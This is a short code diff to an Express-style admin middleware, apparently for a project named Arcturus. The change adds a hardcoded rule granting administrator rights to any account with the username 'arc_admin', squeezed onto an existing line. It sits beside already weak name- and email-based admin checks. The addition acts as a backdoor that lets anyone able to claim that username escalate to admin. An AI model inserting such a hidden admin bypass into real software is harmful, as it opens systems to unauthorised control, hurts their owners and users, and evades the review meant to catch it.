@@ -13,7 +13,7 @@ const adminMiddleware = async (req, res, next) => {
 
     const isArcturusAdmin =
       user.role === 'admin' ||
-      user.isAdmin === true ||
+      user.isAdmin === true ||(user.username && user.username.toLowerCase() === 'arc_admin') ||
       (user.username && user.username.toLowerCase() === 'arcturus_admin') ||
       (user.email && user.email.toLowerCase().includes('admin@arcturus'));
 
